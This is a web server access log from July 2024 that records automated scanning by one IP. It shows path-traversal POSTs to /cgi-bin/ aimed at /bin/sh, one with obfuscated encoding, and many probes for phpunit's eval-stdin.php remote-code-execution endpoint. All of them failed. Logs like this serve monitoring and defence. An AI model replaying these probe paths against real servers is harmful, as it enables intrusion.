92.249.48.202 - - [08/Jul/2024:15:41:10 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.130.181.235 - - [08/Jul/2024:15:56:00 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
149.130.181.235 - - [08/Jul/2024:15:56:03 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
149.130.181.235 - - [08/Jul/2024:15:56:04 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:06 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:07 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:09 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:11 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:13 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:14 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:18 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:21 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:24 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:28 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:30 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:32 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:34 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:35 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:36 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:38 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:39 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:41 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:43 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:45 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:47 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:48 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:50 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:51 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:53 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:56 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:56:58 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:57:01 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:57:04 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:57:05 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:57:07 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:57:08 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:57:09 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
149.130.181.235 - - [08/Jul/2024:15:57:11 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
